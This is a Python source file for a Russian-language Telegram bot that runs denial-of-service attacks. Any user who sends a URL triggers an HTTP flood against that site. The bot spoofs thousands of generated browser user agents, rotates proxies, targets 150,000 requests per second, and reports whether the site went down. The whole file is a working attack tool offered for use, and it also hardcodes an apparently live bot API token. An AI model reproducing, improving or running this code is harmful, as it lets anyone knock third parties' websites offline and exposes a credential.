import asyncio
import aiohttp
import time
import random
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

API_TOKEN = '7932161824:AAEhYsRourQLwHhTqnUJPCdQ-vwGUF1BA6s'

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

active_attacks = {}

def generate_user_agents(count=2000):
    windows_versions = ["10.0", "11.0", "6.1", "6.2", "6.3", "10.0; Win64; x64", "11.0; Win64; x64"]
    mac_versions = ["14_3", "14_2", "14_1", "14_0", "13_6", "13_5", "13_4", "13_3"]
    linux_distros = ["Linux x86_64", "X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]
    
    chrome_versions = [
        (120, 0, 6099, 210), (119, 0, 6045, 200), (118, 0, 5993, 120),
        (117, 0, 5938, 92), (116, 0, 5845, 190)
    ]
    
    firefox_versions = [(121, 0), (120, 0), (119, 0), (118, 0), (117, 0)]
    safari_versions = [(17, 2), (17, 1), (17, 0), (16, 6), (16, 5)]
    
    mobile_devices = [
        ("iPhone", "CPU iPhone OS 17_2 like Mac OS X"),
        ("iPhone", "CPU iPhone OS 17_1 like Mac OS X"), 
        ("Linux; Android 14", "SM-S918B"),
        ("Linux; Android 14", "Pixel 8 Pro"),
        ("Linux; Android 13", "SM-S901B"),
    ]
    
    user_agents = []
    
    for _ in range(count // 3):
        chrome_ver = random.choice(chrome_versions)
        chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
        
        user_agents.append(
            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_str} Safari/537.36"
        )
        
        user_agents.append(
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.choice(mac_versions)}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_str} Safari/537.36"
        )
    
    for _ in range(count // 4):
        firefox_ver = random.choice(firefox_versions)
        firefox_str = f"{firefox_ver[0]}.{firefox_ver[1]}"
        
        user_agents.append(
            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; rv:{firefox_str}) "
            f"Gecko/20100101 Firefox/{firefox_str}"
        )
    
    for _ in range(count // 6):
        safari_ver = random.choice(safari_versions)
        safari_str = f"{safari_ver[0]}.{safari_ver[1]}"
        
        user_agents.append(
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.choice(mac_versions)}) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_str} Safari/605.1.15"
        )
    
    for _ in range(count // 5):
        device, os = random.choice(mobile_devices)
        
        if "iPhone" in device:
            user_agents.append(
                f"Mozilla/5.0 ({device}; {os}) "
                f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
                f"Version/17.2 Mobile/15E148 Safari/604.1"
            )
        else:
            chrome_ver = random.choice(chrome_versions)
            chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
            
            user_agents.append(
                f"Mozilla/5.0 ({os}; {device}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) "
                f"Chrome/{chrome_str} Mobile Safari/537.36"
            )
    
    unique_agents = list(set(user_agents))
    random.shuffle(unique_agents)
    return unique_agents[:count]

USER_AGENTS = generate_user_agents(2000)

def load_proxies():
    try:
        with open('proxies.txt', 'r', encoding='utf-8') as f:
            proxies = []
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                        proxies.append(line)
                    elif ':' in line and '@' in line:
                        proxies.append(f"http://{line}")
                    elif ':' in line:
                        proxies.append(f"http://{line}")
            return proxies
    except FileNotFoundError:
        print("Файл proxies.txt не найден, используем тестовые прокси")
        test_proxies = []
        for i in range(100):
            ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            port = random.choice([8080, 3128, 1080, 8888])
            test_proxies.append(f"http://{ip}:{port}")
        return test_proxies

PROXY_LIST = load_proxies()
PROXY_REUSE_COUNT = 200

class AdvancedAttackManager:
    def __init__(self):
        self.user_agents = USER_AGENTS * 5
        self.proxies = PROXY_LIST * PROXY_REUSE_COUNT if PROXY_LIST else [None]
        
    def get_random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
    
    def get_proxy_for_request(self, request_id):
        if not PROXY_LIST:
            return None
        
        proxy_index = request_id % len(PROXY_LIST)
        return PROXY_LIST[proxy_index]
    
    async def check_site_status(self, url):
        try:
            async with aiohttp.ClientSession() as session:
                start_time = time.time()
                async with session.get(url, timeout=10, ssl=False) as response:
                    end_time = time.time()
                    return {
                        'status': 'online' if response.status == 200 else 'error',
                        'response_time': end_time - start_time,
                        'status_code': response.status
                    }
        except Exception as e:
            return {'status': 'offline', 'error': str(e)}

    async def run_distributed_attack(self, target_url, duration=30, target_rps=150000):
        success_count = 0
        fail_count = 0
        start_time = time.time()
        
        initial_status = await self.check_site_status(target_url)
        
        total_requests = target_rps * duration
        concurrent_workers = min(1000, target_rps // 150)
        
        print(f"Starting attack: {target_rps} RPS, {duration} seconds")
        print(f"Using {len(PROXY_LIST)} proxies with {PROXY_REUSE_COUNT} requests per proxy")
        
        connector = aiohttp.TCPConnector(limit=concurrent_workers, limit_per_host=concurrent_workers)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            semaphore = asyncio.Semaphore(concurrent_workers)
            
            async def send_request(request_id):
                async with semaphore:
                    try:
                        headers = self.get_random_headers()
                        proxy = self.get_proxy_for_request(request_id)
                        
                        async with session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=8),
                            ssl=False
                        ) as response:
                            if response.status == 200:
                                return True
                            return False
                    except Exception:
                        return False
            
            batch_size = 3000
            completed = 0
            
            while time.time() - start_time < duration and completed < total_requests:
                current_batch = min(batch_size, total_requests - completed)
                
                tasks = []
                for i in range(current_batch):
                    task = send_request(completed + i)
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if result is True:
                        success_count += 1
                    else:
                        fail_count += 1
                
                completed += current_batch
                
                progress = (completed / total_requests) * 100
                if completed % (total_requests // 10) == 0:
                    print(f"Progress: {progress:.1f}%")
                
                await asyncio.sleep(0.01)
        
        end_time = time.time()
        attack_duration = end_time - start_time
        
        final_status = await self.check_site_status(target_url)
        
        return {
            'success_count': success_count,
            'fail_count': fail_count,
            'attack_duration': attack_duration,
            'initial_status': initial_status,
            'final_status': final_status,
            'target_rps': target_rps,
            'actual_rps': success_count / attack_duration if attack_duration > 0 else 0,
            'total_requests': success_count + fail_count
        }

attack_manager = AdvancedAttackManager()

def get_start_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="начать ддосить", callback_data="start_attack")],
            [InlineKeyboardButton(text="статистика ресурсов пон", callback_data="stats")]
        ]
    )

def get_cancel_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="отменить ддос", callback_data="cancel_attack")]
        ]
    )

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = (
        "👋 <b>Привет! Я могу помочь тебе положить какойто сайт</b>\n\n"
        "⚡ <i>Возможности моей этой хуйни:</i>\n"
        "• ддошу сайты на тысячи прокси серверов\n"
    )
    
    await message.answer(welcome_text, reply_markup=get_start_keyboard())

@dp.callback_query(F.data == "start_attack")
async def ask_target_url(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🎯 <b>Введи сайт для ддос атаки:</b>\n\n"
        "<i>Отправьте ссылку в чат</i>",
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "stats")
async def show_stats(callback: types.CallbackQuery):
    stats_text = (
        f"📊 <b>Статистика бота:</b>\n\n"
        f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
        f"⚡ <b>Макс. RPS:</b> 150,000\n"
        f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n"
    )
    await callback.message.edit_text(stats_text, reply_markup=get_start_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "cancel_attack")
async def cancel_attack(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id in active_attacks:
        del active_attacks[user_id]
        await callback.message.edit_text("🛑 <b>ддос отменон</b>", parse_mode=ParseMode.HTML)
    else:
        await callback.answer("⚠️ ошибка: ты не начал ддос атаку для отмны")
    await callback.answer()

@dp.message(F.text.contains("http"))
async def start_attack(message: types.Message):
    target_url = message.text.strip()
    user_id = message.from_user.id
    
    if not target_url.startswith(('http://', 'https://')):
        await message.answer("❌ <b>Неверный URL</b>\nИспользуйте формат: <code>https://example.com</code>")
        return
    
    if user_id in active_attacks:
        await message.answer("⚠️ <b>У вас уже есть активная атака ддос</b>\nДождитесь завершения сейчасчишей атаки на сайтт")
        return
    
    status_msg = await message.answer(
        f"🎯 <b>Подготовка к ддосу</b>\n\n"
        f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
        f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
        f"⏱ <b>Длительность:</b> 30-60 секунд\n"
        f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
        f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n\n"
        f"<i>🔄 Инициализация...</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=get_cancel_keyboard()
    )
    
    active_attacks[user_id] = True
    attack_task = asyncio.create_task(
        execute_attack(user_id, target_url, status_msg)
    )

async def execute_attack(user_id: int, target_url: str, status_msg: types.Message):
    try:
        await status_msg.edit_text(
            f"🎯 <b>ддос атака запущена!</b>\n\n"
            f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
            f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
            f"⏱ <b>Длительность:</b> 30-60 секунд\n"
            f"🔄 <b>Запросов на прокси:</b> {PROXY_REUSE_COUNT}\n\n"
            f"<i>🚀 начинаю ддосить нахуй</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=get_cancel_keyboard()
        )
        
        results = await attack_manager.run_distributed_attack(
            target_url=target_url,
            duration=45,
            target_rps=150000
        )
        
        success_rate = (results['success_count'] / results['total_requests']) * 100 if results['total_requests'] > 0 else 0
        
        site_status = "✅ Онлайн" if results['final_status']['status'] == 'online' else "❌ Лежит"
        
        if results['final_status']['status'] == 'online' and results['initial_status']['status'] == 'online':
            performance_change = "🟢 Стабильно"
        elif results['final_status']['status'] == 'online' and results['initial_status']['status'] != 'online':
            performance_change = "🟡 Восстановился"
        else:
            performance_change = "🔴 Упал"
        
        report_text = (
            f"📊 <b>РЕЗУЛЬТАТЫ АТАКИ</b>\n\n"
            f"🌐 <b>Сайт:</b> <code>{target_url}</code>\n"
            f"⏱ <b>Время атаки:</b> {results['attack_duration']:.1f} сек\n"
            f"🎯 <b>Целевой RPS:</b> {results['target_rps']:,}\n"
            f"⚡ <b>Фактический RPS:</b> {results['actual_rps']:,.1f}\n\n"
            f"📨 <b>Статистика запросов:</b>\n"
            f"✅ <b>Успешных:</b> {results['success_count']:,}\n"
            f"❌ <b>Не удалось:</b> {results['fail_count']:,}\n"
            f"📈 <b>Процент успеха:</b> {success_rate:.1f}%\n\n"
            f"🖥 <b>Статус сайта:</b> {site_status}\n"
            f"📊 <b>Производительность:</b> {performance_change}\n\n"
        )
        
        if results['final_status']['status'] == 'online':
            report_text += f"⏱ <b>Время ответа:</b> {results['final_status'].get('response_time', 0):.2f} сек\n"
            report_text += f"🔢 <b>Статус код:</b> {results['final_status'].get('status_code', 'N/A')}"
        else:
            report_text += f"💥 <b>Ошибка:</b> {results['final_status'].get('error', 'Unknown')}"
        
        await status_msg.edit_text(report_text, parse_mode=ParseMode.HTML)
        
    except asyncio.CancelledError:
        await status_msg.edit_text("🛑 <b>Атака отменена пользователем</b>", parse_mode=ParseMode.HTML)
    except Exception as e:
        await status_msg.edit_text(
            f"❌ <b>Ошибка при выполнении атаки:</b>\n\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

async def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    print(f"Сгенерировано юзерагентов: {len(USER_AGENTS):,}")
    print(f"Загружено прокси: {len(PROXY_LIST):,}")
    print(f"Запросов на прокси: {PROXY_REUSE_COUNT}")
    print("Бот готов к работе!")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
